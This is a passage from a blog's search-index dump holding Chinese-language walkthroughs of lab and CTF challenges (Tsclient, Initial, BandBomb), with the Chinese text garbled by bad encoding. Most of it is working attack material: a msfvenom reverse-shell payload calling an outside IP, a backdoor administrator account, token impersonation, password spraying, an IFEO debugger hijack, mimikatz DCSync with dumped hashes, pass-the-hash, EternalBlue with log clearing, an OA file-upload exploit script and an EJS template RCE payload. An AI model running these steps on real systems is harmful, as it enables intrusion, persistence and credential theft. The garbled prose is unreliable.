/add\rå‘½ä»¤æˆåŠŸå®Œæˆã€‚\rC:\\Tmp\u0026gt;net localgroup administrators xrntkk /add\rå‘½ä»¤æˆåŠŸå®Œæˆã€‚\rC:\\Tmp\u0026gt;REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u0026#34; \u0026#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\ræ“ä½œæˆåŠŸå®Œæˆã€‚ ç®¡ç†å‘˜æƒé™å¯ä»¥å·RDPç”¨æˆ·çš„tokenï¼Œä»è€ŒæŸ¥çœ‹å…¶æŒ‚è½½çš„ç›˜ã€‚\nè¿™é‡Œå¯ä»¥ç”¨msfçš„incognitoæ¨¡å—\nubuntu@VM-20-9-ubuntu:~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=106.55.168.231 LPORT=9999 -f exe -o msf.exe\r[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x64 from the payload\rNo encoder specified, outputting raw payload\rPayload size: 510 bytes\rFinal size of exe file: 7168 bytes\rSaved as: msf.exe å…ˆç”¨msfä¸Šä¸ªçº¿\nmsfconsole\ruse exploit/multi/handler\rset payload windows/x64/meterpreter/reverse_tcp\rset lhost 106.55.168.231\rset lport 9999\rexploit ä¸Šçº¿\næ¥ç€ç”¨incognitoæ¨¡å—å·Johnçš„token\n1meterpreter \u0026gt; use incognito 2Loading extension incognito...Success. 3meterpreter \u0026gt; list_tokens -u 4 5Delegation Tokens Available 6======================================== 7IIS APPPOOL\\DefaultAppPool 8NT AUTHORITY\\LOCAL SERVICE 9NT AUTHORITY\\NETWORK SERVICE 10NT AUTHORITY\\SYSTEM 11NT SERVICE\\MsDtsServer130 12NT SERVICE\\MSSQLFDLauncher 13NT SERVICE\\MSSQLSERVER 14NT SERVICE\\MSSQLServerOLAPService 15NT SERVICE\\ReportServer 16NT SERVICE\\SQLTELEMETRY 17NT SERVICE\\SSASTELEMETRY 18NT SERVICE\\SSISTELEMETRY130 19WIN-WEB\\John 20WIN-WEB\\test 21WIN-WEB\\xrntkk 22Window Manager\\DWM-1 23Window Manager\\DWM-2 24Window Manager\\DWM-3 25Window Manager\\DWM-4 26 27Impersonation Tokens Available 28======================================== 29No tokens available å¯ä»¥çœ‹åˆ°å·²ç»æ‹¿åˆ°Johnçš„tokenäº†\nä»¥Johnçš„èº«ä»½è¿è¡Œcmd\n1meterpreter \u0026gt; impersonate_token WIN-WEB\\\\John 2[+] Delegation token available 3[+] Successfully impersonated user WIN-WEB\\John 4meterpreter \u0026gt; shell 5Process 7508 created. 6Channel 1 created. 7... 8 9C:\\Tmp\u0026gt;whoami 10whoami 11win-web\\john net use çœ‹ä¸€ä¸‹æŒ‚è½½æƒ…å†µï¼ˆä¸çŸ¥é“ä¸ºå•¥æˆ‘è¿™ä¹±ç äº†ï¼‰\næŒ‚è½½äº†cç›˜\næŸ¥çœ‹cç›˜ä¸­çš„credential.txtæ–‡ä»¶\nC:\\Tmp\u0026gt;type \\\\TSCLIENT\\C\\credential.txt\rtype \\\\TSCLIENT\\C\\credential.txt\rxiaorang.lab\\Aldrich:Ald@rLMWuy7Z!#\rDo you know how to hijack Image? è¿™é‡Œæœ‰ä¸€ä¸²è´¦å·å¯†ç ï¼Œç”¨è¿™ä¸²è´¦å·å¯†ç è¿›è¡Œä¸€ä¸ªå¯†ç å–·æ´’\ncrackmapexec -q smb 172.22.8.0/24 -u Aldrich -p Ald@rLMWuy7Z!# â”Œâ”€â”€(rootã‰¿Xrntkk-Laptop)-[/home/xrntkk]\râ””â”€# proxychains4 -q crackmapexec smb 172.22.8.0/24 -u Aldrich -p Ald@rLMWuy7Zproxychains4 crackmapexec smb 172.22.8.0/24\r-u Aldrich -p Ald@rLMWuy7Z\rSMB 172.22.8.18 445 WIN-WEB [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN-WEB) (domain:WIN-WEB) (signing:False) (SMBv1:True)\rSMB 172.22.8.46 445 WIN2016 [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)\rSMB 172.22.8.31 445 WIN19-CLIENT [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)\rSMB 172.22.8.46 445 WIN2016 [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.15 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False)\rSMB 172.22.8.18 445 WIN-WEB [-] WIN-WEB\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.31 445 WIN19-CLIENT [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.15 445 DC01 [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE å¯ä»¥çœ‹åˆ°è¿™ä¸‰å°æœºè²Œä¼¼éƒ½èƒ½ç™»ä¸Šå»\nSMB 172.22.8.46 445 WIN2016 [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)\rSMB 172.22.8.31 445 WIN19-CLIENT [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)\rSMB 172.22.8.15 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False) æˆ‘è¿™é‡Œé€‰æ‹©ç™»31\nproxychains4 rdesktop 172.22.8.31 -u Aldrich -d xiaorang.lab -p \u0026#39;Ald@rLMWuy7Z!#\u0026#39; è¿™é‡Œè¦ç”¨rdesktopç™»ï¼Œrdpç™»ä¸ä¸Š\nä¼šæç¤ºå¯†ç è¿‡æœŸï¼Œæ”¹ä¸ªå¯†ç å°±è¡Œäº†\nä½†æ˜¯æ”¹å®Œå¯†ç è¿™å°æœºè¿˜æ˜¯ç™»ä¸ä¸Šï¼Œæ²¡æœ‰ç™»é™†æƒé™\næ‰€ä»¥æˆ‘ä»¬å°è¯•ç”¨è¿™ä¸ªä¿®æ”¹åçš„è´¦å·å¯†ç å†å»ç™»è¿™ä¸ªè´¦å·çš„å¦ä¸€å°æœºå­\næˆåŠŸåœ¨46ä¸­ç™»å…¥ï¼Œåé¢è¿˜æ˜¯ç”¨rdpå§ï¼Œrdesktopä¹Ÿå¤ªå¡äº†\nxiaorang.lab\\Aldrich\rAbc123456 FLAG2 ä¿¡æ¯æ”¶é›†ä¸€ä¸‹\nå¯ä»¥çœ‹åˆ°æˆ‘ä»¬å·²ç»æ‹¿ä¸‹åŸŸå†…çš„ä¸€å°æœºå­äº†\nsysteminfo è¿™å°æœºå­ä¸å‡ºç½‘ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å…±äº«æ–‡ä»¶å¤¹çš„æ–¹å¼æ¥ä¼ æ–‡ä»¶\nè¿™é‡Œæˆ‘æ˜¯ç”¨ç¬¬ä¸€å°æœºå­(172.22.8.18)ï¼Œå°†æ–‡ä»¶å¤¹C:/xrntkkå…±äº«ç»™(172.22.8.46)\nåœ¨46ä¸ŠWin+Rå¹¶è¾“å…¥\n\\\\172.22.8.18 è¾“å…¥18å…±äº«æ–‡ä»¶çš„è´¦å·å¯†ç å³å¯\næ¥ç€æˆ‘ä»¬ç”¨bloodhoundæ¥è¿›è¡Œä¸€ä¸‹åŸŸå†…ä¿¡æ¯æ”¶é›†\nSharpHound.exe -c all å°†æ•°æ®é‡‡é›†å®Œç”Ÿæˆçš„zipæ–‡ä»¶ï¼Œä¸Šä¼ å¯¼å…¥åˆ°BloodHoundåˆ†æ\nä»å›¾ä¸­ï¼Œæˆ‘ä»¬ä¼šå‘ç°46è¿™å°æœºå­çš„ç”¨æˆ·æ˜¯åŸŸç®¡ï¼Œé‚£æˆ‘ä»¬æ¥ä¸‹æ¥å°±è¦æƒ³åŠæ³•åœ¨è¿™å°æœºå­ä¸Šææƒï¼Œç„¶åæ‹¿ä¸‹åŸŸæ§\næ ¹æ®å‰é¢çš„hint\nDo you know how to hijack Image? æˆ‘ä»¬å¯ä»¥çŸ¥é“æ¥ä¸‹æ¥è¦è¿›è¡Œé•œåƒåŠ«æŒ(IFEO)ææƒ\nGet-ACL -Path \u0026#34;HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\u0026#34; | fl è¿™æ¡å‘½ä»¤çš„æ„æ€æ˜¯è·å–æŒ‡å®šæ³¨å†Œè¡¨è·¯å¾„çš„è®¿é—®æ§åˆ¶åˆ—è¡¨ï¼ˆACLï¼‰ã€‚\nNT AUTHORITY\\Authenticated Users æˆ‘ä»¬å¯ä»¥å‘ç°å…¨éƒ¨å·²ç™»å½•ç”¨æˆ·éƒ½å¯ä»¥å¯¹æ³¨å†Œè¡¨è¿›è¡Œä¿®æ”¹\né‚£æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨è¿›è¡Œæ˜ åƒåŠ«æŒ\næˆ‘ä»¬è¿™é‡Œé€šè¿‡å°†æ”¾å¤§é•œå¯åŠ¨çš„magnify.exeæ›¿æ¢æˆC:\\windows\\system32\\cmd.exeï¼Œæ¥è¿›è¡Œææƒ\n1REG ADD \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe\u0026#34; /v Debugger /t REG_SZ /d \u0026#34;C:\\windows\\system32\\cmd.exe\u0026#34; ä¿®æ”¹åé€‰æ‹©é”å®š\nåœ¨é”å®šé¡µé¢é€‰æ‹©æ”¾å¤§é•œå³å¯\ntype c:\\Users\\Administrator\\flag\\flag02.txt æ¥ç€æˆ‘ä»¬å¯ä»¥æ–°å»ºä¸€ä¸ªç”¨æˆ·è®©rdpå¯ä»¥è¿ä¸Šå»\nFLAG3 æ¥ä¸‹æ¥å°±æ˜¯å¸¸è§„çš„å°†åŸŸå†…ç”¨æˆ·çš„å“ˆå¸Œdumpä¸‹æ¥\nmimikatz.exe \u0026#34;lsadump::dcsync /domain:xiaorang.lab /all /csv\u0026#34; exit \u0026gt; mimikatz.txt ç»“æœ\n.#####. mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08\r.## ^ ##. \u0026#34;A La Vie, A L\u0026#39;Amour\u0026#34; - (oe.eo)\r## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\r## \\ / ## \u0026gt; https://blog.gentilkiwi.com/mimikatz\r\u0026#39;## v ##\u0026#39; Vincent LE TOUX ( vincent.letoux@gmail.com )\r\u0026#39;#####\u0026#39; \u0026gt; https://pingcastle.com / https://mysmartlogon.com ***/\rmimikatz(commandline) # lsadump::dcsync /domain:xiaorang.lab /all /csv\r[DC] \u0026#39;xiaorang.lab\u0026#39; will be the domain\r[DC] \u0026#39;DC01.xiaorang.lab\u0026#39; will be the DC server\r[DC] Exporting domain \u0026#39;xiaorang.lab\u0026#39;\r[rpc] Service : ldap\r[rpc] AuthnSvc : GSS_NEGOTIATE (9)\r502\tkrbtgt\t3ffd5b58b4a6328659a606c3ea6f9b63\t514\r1000\tDC01$\t7408967f1fd3c2ff807232b7b5c5fc95\t532480\r500\tAdministrator\t2c9d81bdcf3ec8b1def10328a7cc2f08\t512\r1103\tWIN2016$\taae3dca76f254c52708ee076935bb533\t16781312\r1104\tWIN19-CLIENT$\t7c011200ecbe666945e465c200afcb5e\t16781312\r1105\tAldrich\t0607f770c2f37e09a850e09e920a9f45\t512\rmimikatz(commandline) # exit\rBye! ä¹‹åå°±å¯ä»¥è¿›è¡Œæ¨ªå‘ç§»åŠ¨äº†\nproxychains4 impacket-smbexec -hashes :2c9d81bdcf3ec8b1def10328a7cc2f08 xiaorang.lab/administrator@172.22.8.15 -codec gbk type c:\\users\\administrator\\flag\\flag03.txt æ‹¿åˆ°æœ€åä¸€ä¸ªflag\nC:\\Windows\\system32\u0026gt;type c:\\users\\administrator\\flag\\flag03.txt\r_________ __ _ _\r| _ _ | [ | (_) / |_\r|_/ | | \\_|.--. .---. | | __ .---. _ .--. `| |-\u0026#39;\r| | ( (`\\] / /\u0026#39;`\\] | | [ |/ /__\\\\[ `.-. | | |\r_| |_ `\u0026#39;.\u0026#39;. | \\__. | | | || \\__., | | | | | |,\r|_____| [\\__) )\u0026#39;.___.\u0026#39;[___][___]\u0026#39;.__.\u0026#39;[___||__]\\__/\rCongratulations! ! !\rflag03: flag{410202d3-2e47-4619-a6b0-96051a985f2e} è¿™é¢˜ç”¨csæ‰“ä¼šæ–¹ä¾¿å¾ˆå¤šï¼Œä½†æ˜¯ä¸€å¼€å§‹æ²¡è€ƒè™‘åˆ°ï¼Œæ‰€ä»¥åé¢ä¹Ÿä¸€ç›´æ²¡ç”¨ã€‚\n","permalink":"http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-tsclient-writeup/","summary":"\u003cp\u003eTsclientæ˜¯ä¸€å¥—éš¾åº¦ä¸ºä¸­ç­‰çš„é¶åœºç¯å¢ƒï¼Œå®Œæˆè¯¥æŒ‘æˆ˜å¯ä»¥å¸®åŠ©ç©å®¶äº†è§£å†…ç½‘æ¸—é€ä¸­çš„ä»£ç†è½¬å‘ã€å†…ç½‘æ‰«æã€ä¿¡æ¯æ”¶é›†ã€ç‰¹æƒæå‡ä»¥åŠæ¨ªå‘ç§»åŠ¨æŠ€æœ¯æ–¹æ³•ï¼ŒåŠ å¼ºå¯¹åŸŸç¯å¢ƒæ ¸å¿ƒè®¤è¯æœºåˆ¶çš„ç†è§£ï¼Œä»¥åŠæŒæ¡åŸŸç¯å¢ƒæ¸—é€ä¸­ä¸€äº›æœ‰è¶£çš„æŠ€æœ¯è¦ç‚¹ã€‚è¯¥é¶åœºå…±æœ‰3ä¸ªflagï¼Œåˆ†å¸ƒäºä¸åŒçš„é¶æœºã€‚\u003c/p\u003e","title":"æ˜¥ç§‹äº‘é•œ-Tsclient-Writeup"},{"content":" å‚è€ƒæ–‡ç« \nhttps://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\nèœé¸¡ç¬¬ä¸€ä¸ªé€šå…³çš„é¶åœºOrz\nFLAG1 fscanæ‰«ä¸€ä¸‹\n./fscan.exe -h 39.99.139.119 ç›´æ¥ç”¨thinkphpguiå†™é©¬è¿èšå‰‘\nå…ˆç”¨vshellä¸Šçº¿\nè¯»flagéœ€è¦ææƒ\npeass-ng/PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors)\nä¼ ä¸ªlinpeasæ‰«ä¸€ä¸‹\n./linpeas_linux_amd64 \u0026gt; output.txt åœ¨å†å²æ–‡ä»¶ä¸­æ‰¾åˆ°ç–‘ä¼¼è¯»flagçš„å‘½ä»¤\nå…¶å®è¿™å°±æ˜¯ä¸€ä¸ªç®€å•çš„sudoææƒ\næ¸—é€æµ‹è¯•ï¼šLinuxææƒç²¾è®²ï¼ˆä¸‰ï¼‰ä¹‹sudoæ–¹æ³•ç¬¬ä¸‰æœŸ_nmap sudo ææƒ-CSDNåšå®¢\nmysql æ˜¯é…ç½®äº† sudo å…å¯†ä½¿ç”¨çš„ï¼Œå¯ä»¥ä½¿ç”¨ mysql ææƒï¼Œé€šè¿‡mysqlæ‰§è¡Œå‘½ä»¤æ¥è¯»flag\npayload:\nsudo mysql -e \u0026#39;\\! /bin/sh\u0026#39;\rcat /root/flag/flag* flag01: flag{60b53231- æ¥ä¸‹æ¥æ­ä»£ç†\næŸ¥å†…ç½‘ip\næ¥ç€ä¼ ä¸€ä¸ªfscanæ‰«ä¸€ä¸‹å†…ç½‘\nfs -h 172.22.1.0/24 -nobr -nopoc -hn 172.22.1.15 æ”¶é›†åˆ°çš„ä¿¡æ¯\n172.22.1.2:DCåŸŸæ§\r172.22.1.21:Windowsçš„æœºå™¨å¹¶ä¸”å­˜åœ¨MS17-010 æ¼æ´\r172.22.1.18:ä¿¡å‘¼OAåŠå…¬ç³»ç»Ÿ FLAG2 å…ˆçœ‹ä¿¡å‘¼\nå¼±å£ä»¤æˆåŠŸç™»å…¥admin/admin123\nä¿¡å‘¼ååŒåŠå…¬ç³»ç»Ÿv2.2.8å­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´\n[Awesome-POC/OAäº§å“æ¼æ´/ä¿¡å‘¼OA qcloudCosAction.php ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´.md at master Â· Threekiii/Awesome-POC](https://github.com/Threekiii/Awesome-POC/blob/master/OAäº§å“æ¼æ´/ä¿¡å‘¼OA qcloudCosAction.php ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´.md)\n1import requests 2 3session = requests.session() 4url_pre = \u0026#39;http://172.22.1.18/\u0026#39; 5url1 = url_pre + \u0026#39;?a=check\u0026amp;m=login\u0026amp;d=\u0026amp;ajaxbool=true\u0026amp;rnd=533953\u0026#39; 6url2 = url_pre + \u0026#39;/index.php?a=upfile\u0026amp;m=upload\u0026amp;d=public\u0026amp;maxsize=100\u0026amp;ajaxbool=true\u0026amp;rnd=798913\u0026#39; 7# url3 = url_pre + \u0026#39;/task.php?m=qcloudCos|runt\u0026amp;a=run\u0026amp;fileid=\u0026lt;ID\u0026gt;\u0026#39; 8data1 = { 9 \u0026#39;rempass\u0026#39;: \u0026#39;0\u0026#39;, 10 \u0026#39;jmpass\u0026#39;: \u0026#39;false\u0026#39;, 11 \u0026#39;device\u0026#39;: \u0026#39;1625884034525\u0026#39;, 12 \u0026#39;ltype\u0026#39;: \u0026#39;0\u0026#39;, 13 \u0026#39;adminuser\u0026#39;: \u0026#39;YWRtaW4=\u0026#39;, 14 \u0026#39;adminpass\u0026#39;: \u0026#39;YWRtaW4xMjM=\u0026#39;, 15 \u0026#39;yanzm\u0026#39;: \u0026#39;\u0026#39; 16} 17 18r = session.post(url1, data=data1) 19r = session.post(url2, files={\u0026#39;file\u0026#39;: open(\u0026#39;1.php\u0026#39;, \u0026#39;r\u0026#39;)}) 20filepath = str(r.json()[\u0026#39;filepath\u0026#39;]) 21filepath = \u0026#34;/\u0026#34; + filepath.split(\u0026#39;.uptemp\u0026#39;)[0] + \u0026#39;.php\u0026#39; 22print(filepath) 23id = r.json()[\u0026#39;id\u0026#39;] 24url3 = url_pre + f\u0026#39;/task.php?m=qcloudCos|runt\u0026amp;a=run\u0026amp;fileid={id}\u0026#39; 25r = session.get(url3) 26r = session.get(url_pre + filepath + \u0026#34;?1=system(\u0026#39;dir\u0026#39;);\u0026#34;) 27print(r.text) å†™é©¬ä¹‹åç›´æ¥è¯»flagå°±è¡Œ\nflag02: 2ce3-4813-87d4- FLAG3 æ°¸æ’ä¹‹è“å¯ä»¥ç”¨msfæ‰“\nç°åœ¨kaliä¸Šç”¨proxychains4ç®€å•é…ä¸ªä»£ç†\nproxychains4 msfconsole\rsearch ms17-010 æœ‰å››ä¸ªä¸åŒçš„æ¨¡å—\nè¿™é‡Œä½¿ç”¨ç¬¬ä¸€ä¸ªæ¨¡å—ï¼Œå› ä¸ºåˆ©ç”¨èŒƒå›´æ¯”è¾ƒå¹¿\nuse exploit/windows/smb/ms17_010_eternalblue # é€‰æ‹©ä½¿ç”¨çš„æ¨¡å—\rset payload windows/x64/meterpreter/bind_tcp_uuid # è®¾ç½®payloadï¼Œå¯ä»¥é€šè¿‡show payloadsæŸ¥çœ‹\rset RHOSTS 172.22.1.21 # è®¾ç½®é¶æœºçš„ip\rexploit # å‘èµ·æ”»å‡» æˆåŠŸäº†\nmeterpreter \u0026gt; screenshot # æ•è·å±å¹•\rmeterpreter \u0026gt; upload hello.txt c:// #ä¸Šä¼ æ–‡ä»¶\rmeterpreter \u0026gt; download d://1.txt # ä¸‹è½½æ–‡ä»¶\rmeterpreter \u0026gt; shell # è·å–cmd\rmeterpreter \u0026gt; clearev # æ¸…é™¤æ—¥å¿— load kiwi # è°ƒç”¨mimikatzæ¨¡å—\rkiwi_cmd \u0026#34;lsadump::dcsync /domain:xiaorang.lab /all /csv\u0026#34; exit # å¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·çš„ä¿¡æ¯(åŒ…æ‹¬å“ˆå¸Œå€¼) æ‹¿åˆ°Administrator ç”¨æˆ·çš„ hashï¼Œæ¥ç€ä½¿ç”¨ crackmapexec æ¥è¿›è¡Œå“ˆå¸Œä¼ é€’æ”»å‡»ï¼Œæ¥å®ç° DCåŸŸæ§ ä¸Šçš„ä»»æ„å‘½ä»¤æ‰§è¡Œ\nproxychains4 crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x \u0026#34;type Users\\Administrator\\flag\\flag03.txt\u0026#34; æ‹¿åˆ°æœ€åä¸€ä¸ªflag\n","permalink":"http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial-writeup/","summary":"\u003cblockquote\u003e\n\u003cp\u003eå‚è€ƒæ–‡ç« \u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\"\u003ehttps://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\u003c/a\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003eèœé¸¡ç¬¬ä¸€ä¸ªé€šå…³çš„é¶åœºOrz\u003c/p\u003e\n\u003ch3 id=\"flag1\"\u003eFLAG1\u003c/h3\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250306184027336\" loading=\"lazy\" src=\"./assets/image-20250306184027336.png\"\u003e\u003c/p\u003e\n\u003cp\u003efscanæ‰«ä¸€ä¸‹\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e./fscan.exe -h 39.99.139.119\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg alt=\"image-20250306184106697\" loading=\"lazy\" src=\"./assets/image-20250306184106697.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç›´æ¥ç”¨thinkphpguiå†™é©¬è¿èšå‰‘\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250306185409381\" loading=\"lazy\" src=\"./assets/image-20250306185409381.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå…ˆç”¨vshellä¸Šçº¿\u003c/p\u003e\n\u003cp\u003eè¯»flagéœ€è¦ææƒ\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/peass-ng/PEASS-ng\"\u003epeass-ng/PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors)\u003c/a\u003e\u003c/p\u003e","title":"æ˜¥ç§‹äº‘é•œ-Initial-Writeup"},{"content":"Web week1 Level 24 Pacman æ‹¿åˆ°ç¯å¢ƒ\nä¸€ä¸ªå°æ¸¸æˆï¼ŒçŒœæµ‹åº”è¯¥æ˜¯jså®¡è®¡\næŸ¥çœ‹index.jså‘ç°ä»£ç è¿›è¡Œäº†æ··æ·†\nå¯ä»¥ç”¨å·¥å…·åæ··æ·†ä¸€ä¸‹ï¼Œå¢åŠ ä¸€ä¸‹å¯è¯»æ€§\nhttps://tool.yuanrenxue.cn/decode_obfuscator\nåæ··æ·†ä¹‹åæ‰¾åˆ°è¿™ä¸ª\næ„Ÿè§‰æ˜¯æ …æ ï¼Œè§£å¯†æ‹¿åˆ°flag\nLevel 47 BandBomb æ–‡ä»¶ä¸Šä¼ \né™„ä»¶æœ‰æºç \n1const express = require(\u0026#39;express\u0026#39;); 2const multer = require(\u0026#39;multer\u0026#39;); 3const fs = require(\u0026#39;fs\u0026#39;); 4const path = require(\u0026#39;path\u0026#39;); 5 6const app = express(); 7 8app.set(\u0026#39;view engine\u0026#39;, \u0026#39;ejs\u0026#39;); 9 10app.use(\u0026#39;/static\u0026#39;, express.static(path.join(__dirname, \u0026#39;public\u0026#39;))); 11app.use(express.json()); 12 13const storage = multer.diskStorage({ 14 destination: (req, file, cb) =\u0026gt; { 15 const uploadDir = \u0026#39;uploads\u0026#39;; 16 if (!fs.existsSync(uploadDir)) { 17 fs.mkdirSync(uploadDir); 18 } 19 cb(null, uploadDir); 20 }, 21 filename: (req, file, cb) =\u0026gt; { 22 cb(null, file.originalname); 23 } 24}); 25 26const upload = multer({ 27 storage: storage, 28 fileFilter: (_, file, cb) =\u0026gt; { 29 try { 30 if (!file.originalname) { 31 return cb(new Error(\u0026#39;æ— æ•ˆçš„æ–‡ä»¶å\u0026#39;), false); 32 } 33 cb(null, true); 34 } catch (err) { 35 cb(new Error(\u0026#39;æ–‡ä»¶å¤„ç†é”™è¯¯\u0026#39;), false); 36 } 37 } 38}); 39 40app.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { 41 const uploadsDir = path.join(__dirname, \u0026#39;uploads\u0026#39;); 42 43 if (!fs.existsSync(uploadsDir)) { 44 fs.mkdirSync(uploadsDir); 45 } 46 47 fs.readdir(uploadsDir, (err, files) =\u0026gt; { 48 if (err) { 49 return res.status(500).render(\u0026#39;mortis\u0026#39;, { files: [] }); 50 } 51 res.render(\u0026#39;mortis\u0026#39;, { files: files }); 52 }); 53}); 54 55app.post(\u0026#39;/upload\u0026#39;, (req, res) =\u0026gt; { 56 upload.single(\u0026#39;file\u0026#39;)(req, res, (err) =\u0026gt; { 57 if (err) { 58 return res.status(400).json({ error: err.message }); 59 } 60 if (!req.file) { 61 return res.status(400).json({ error: \u0026#39;æ²¡æœ‰é€‰æ‹©æ–‡ä»¶\u0026#39; }); 62 } 63 res.json({ 64 message: \u0026#39;æ–‡ä»¶ä¸Šä¼ æˆåŠŸ\u0026#39;, 65 filename: req.file.filename 66 }); 67 }); 68}); 69 70app.post(\u0026#39;/rename\u0026#39;, (req, res) =\u0026gt; { 71 const { oldName, newName } = req.body; 72 const oldPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, oldName); 73 const newPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, newName); 74 75 if (!oldName || !newName) { 76 return res.status(400).json({ error: \u0026#39; \u0026#39; }); 77 } 78 79 fs.rename(oldPath, newPath, (err) =\u0026gt; { 80 if (err) { 81 return res.status(500).json({ error: \u0026#39; \u0026#39; + err.message }); 82 } 83 res.json({ message: \u0026#39; \u0026#39; }); 84 }); 85}); 86 87app.listen(port, () =\u0026gt; { 88 console.log(`æœåŠ¡å™¨è¿è¡Œåœ¨ http://localhost:${port}`); 89}); è¿™é¢˜æœ‰ç‚¹åƒ24å›½èµ›çš„ezjs\næ–‡ç«  - å¯¹ejså¼•æ“æ¼æ´åŠå‡½æ•°ç‰¹æ€§çš„åˆ©ç”¨ - å…ˆçŸ¥ç¤¾åŒº\nå¯ä»¥çœ‹åˆ°åœ¨ /rename è·¯ç”±\n1app.post(\u0026#39;/rename\u0026#39;, (req, res) =\u0026gt; { 2 const { oldName, newName } = req.body; 3 const oldPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, oldName); 4 const newPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, newName); 5 6 if (!oldName || !newName) { 7 return res.status(400).json({ error: \u0026#39; \u0026#39; }); 8 } 9 10 fs.rename(oldPath, newPath, (err) =\u0026gt; { 11 if (err) { 12 return res.status(500).json({ error: \u0026#39; \u0026#39; + err.message }); 13 } 14 res.json({ message: \u0026#39; \u0026#39; }); 15 }); 16}); è¿™ä¸ªè·¯ç”±ä¼šå°†uploadsç›®å½•ä¸­çš„æ–‡ä»¶é‡å‘½å\næˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªè·¯ç”±ï¼Œé€šè¿‡ç›®å½•ç©¿è¶Šå¯¹ä»»æ„æ–‡ä»¶è¿›è¡Œç§»åŠ¨å’Œé‡å‘½å\nä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸Šä¼ æ¶æ„çš„ejsåˆ°uploadsç›®å½•ï¼Œæ¥ç€é€šè¿‡/renameè·¯ç”±å°†æˆ‘ä»¬ä¸Šä¼ çš„æ¶æ„ejsæ–‡ä»¶è¦†å†™æ‰/è·¯ç”±çš„æ¨¡æ¿æ–‡ä»¶mortis.ejså®ç°RCE\neval.ejs\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt; \u0026lt;%= process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;whoami\u0026#39;) %\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; å°†ejsä¸Šä¼ \nè¦†å†™åŸæ¥çš„ejs\nè®¿é—®/\nè¿™é¢˜flagè—åœ¨ç¯å¢ƒå˜é‡é‡Œ\npayload:\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt; \u0026lt;%= process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;printenv\u0026#39;) %\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Level 